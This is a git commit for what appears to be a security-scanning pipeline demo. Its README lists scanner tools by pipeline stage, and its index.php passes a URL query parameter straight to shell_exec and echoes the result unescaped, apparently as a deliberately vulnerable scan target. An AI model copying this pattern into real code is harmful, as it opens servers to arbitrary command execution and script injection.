a5593cf1a01de27e176d0121e44c3670f1ea5639
I <im@ua.fm>
2020-06-10 12:54:18 +0300

    first commit

---
+++ README.md
@@ -0,0 +1,8 @@
+stages
+    find secrets https://github.com/dxa4481/truffleHog
+    scan code https://wapiti.sourceforge.io/ https://www.arachni-scanner.com/
+    code review
+        build image
+    scan image https://github.com/aquasecurity/trivy, https://anchore.com/
+    report
+        deploy
---
+++ index.php
@@ -0,0 +1,17 @@
+<html>
+ <head>
+  <title>PHP Test</title>
+ </head>
+ <body>
+    <?php 
+        $params = "$_SERVER[REQUEST_URI]";
+        // parse_str($url_components['query'], $params); 
+        parse_str(parse_url($params)['query'], $params);
+        $cmd = $params['param'];
+        $result = shell_exec($cmd);
+        echo $result;
+        echo "<script>console.log('Debug Objects: " . $result . "' );</script>";
+    ?>
+    
+ </body>
+</html>
